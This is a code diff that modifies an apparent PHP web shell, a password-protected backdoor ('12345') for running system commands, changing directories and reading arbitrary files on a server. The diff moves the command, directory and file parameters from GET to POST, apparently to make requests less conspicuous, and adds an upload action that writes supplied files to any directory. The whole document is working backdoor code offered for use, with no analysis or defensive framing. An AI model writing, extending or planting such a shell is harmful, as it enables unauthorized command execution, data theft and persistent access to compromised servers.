@@ -3,9 +3,9 @@
 error_reporting(0);
 
 $password = "12345";
-$get_password = $_GET["password"];
-$cmd = $_GET["cmd"];
-$aksi = $_GET["aksi"];
+$get_password = $_POST["password"];
+$cmd = $_POST["cmd"];
+$aksi = $_POST["aksi"];
 
 function exe($cmd){
     if(function_exists('system')){
@@ -241,9 +241,9 @@ if($password === $get_password)
 { 
   if(isset($cmd))
   {
-	if(isset($_GET['dir']))
+	if(isset($_POST['dir']))
 	{
-		$dir = $_GET['dir'];
+		$dir = $_POST['dir'];
 		chdir($dir);
 	} 
 	else
@@ -300,7 +300,7 @@ if($password === $get_password)
     else if($aksi == "download")
     {
         header('Content-Type: text/plain');
-        $file = $_GET["file"];
+        $file = $_POST["file"];
         if($cek = file_get_contents($file))
         {
             echo $cek;
@@ -309,6 +309,25 @@ if($password === $get_password)
         {
             echo "False";
         }
+    }
+    else if($aksi == "upload")
+    {
+        header('Content-Type: text/plain');
+
+        $dir = $_POST['dir'];
+        $name = $_POST['name'];
+        $context = $_FILES['file']['tmp_name'];
+        $target_file = $dir. '/'.$name;
+
+        if(move_uploaded_file($_FILES["file"]["tmp_name"], $target_file))
+        {
+            echo "success";
+        }
+        else
+        {
+            echo "error";
+        }
+
     }
     else if($aksi == "show_subdo")
     {
